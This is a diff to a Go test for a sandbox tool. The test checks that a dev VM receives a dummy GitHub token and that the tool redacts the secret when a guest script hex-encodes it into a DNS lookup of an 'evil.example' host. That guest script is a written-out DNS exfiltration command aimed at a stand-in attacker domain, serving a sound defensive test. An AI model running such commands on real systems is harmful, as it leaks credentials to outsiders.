@@ -11,6 +11,7 @@ import (
 	"os"
 	"os/exec"
 	"path/filepath"
+	"regexp"
 	"strconv"
 	"strings"
 	"testing"
@@ -534,13 +535,22 @@ func TestDevSecretsOnVM(t *testing.T) {
 	}
 	const value = "ghp_sboxvmtest0123456789"
 	lookup := func(k string) (string, bool) { return value, k == "GH_SBOX_TEST" }
-	script := `echo "token=$GITHUB_TOKEN plain=$PLAIN"; grep -rlI ` + value + ` /home/runner 2>/dev/null | grep -v '^/proc' || echo not-on-home`
+	script := `echo "token=$GITHUB_TOKEN plain=$PLAIN"; grep -rlI ` + value + ` /home/runner 2>/dev/null | grep -v '^/proc' || echo not-on-home
+uname -n; getent hosts "$(uname -n)" >/dev/null && echo own-name-resolves
+getent hosts "$(printf %s "$GITHUB_TOKEN" | od -An -tx1 | tr -d ' \n').evil.example"; true`
 	var out, errOut bytes.Buffer
 	if code := devMain(ctx, []string{dir, "--", "sh", "-c", script}, strings.NewReader(""), &out, &errOut, sboxRun, devHost{stateDir: t.TempDir(), lookupEnv: lookup}); code != exitOK {
 		t.Fatalf("sbox dev: exit %d: %s%s", code, out.String(), errOut.String())
 	}
 	if !strings.Contains(out.String(), "token="+value+" plain=yes") || !strings.Contains(out.String(), "not-on-home") {
 		t.Errorf("guest: %q, want the secret over dev.env, dev.env too, and the value nowhere in the home", out.String())
+	}
+	if !regexp.MustCompile(`(?m)^[g-v]{6}$`).MatchString(out.String()) || !strings.Contains(out.String(), "own-name-resolves") {
+		t.Errorf("guest: %q, want a six-letter hostname from the nonce that resolves", out.String())
+	}
+	hexed := fmt.Sprintf("%x", value)
+	if strings.Contains(errOut.String(), hexed) || !strings.Contains(errOut.String(), "[redacted:GITHUB_TOKEN].evil.example") {
+		t.Errorf("summary:\n%s\nwant the hex-encoded secret in the lookup redacted", errOut.String())
 	}
 }
 
